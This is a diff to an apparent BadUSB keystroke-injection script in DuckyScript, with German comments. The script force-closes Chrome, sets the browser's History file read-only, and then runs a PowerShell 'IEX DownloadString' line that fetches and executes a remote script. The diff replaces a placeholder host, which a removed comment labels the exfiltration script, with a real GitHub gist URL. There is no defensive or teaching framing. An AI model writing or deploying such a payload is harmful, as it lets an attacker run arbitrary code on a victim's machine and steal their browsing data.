@@ -11,15 +11,9 @@ STRING taskkill /F /IM chrome.exe /T;
 DELAY 200
 STRING $h = "$env:LocalAppData\Google\Chrome\User Data\Default\History"; attrib +r $h;
 DELAY 200
-
-REM 3. Dein eigentliches Exfiltrations-Skript (hier als Platzhalter)
-STRING IEX (New-Object Net.WebClient).DownloadString('https://dein-link.com/script.ps1');
+STRING IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/Sebisname/0ec07082c5a2bc753841c4af021afad4/raw/b631f3a71faa52023fed9c5bc67484551eae94dc/Secret%2520Gist');
 DELAY 500
-
-REM 4. Schreibschutz wieder aufheben
 STRING attrib -r $h;
 DELAY 200
-
-REM 5. Fenster schliessen
 STRING exit
 ENTER
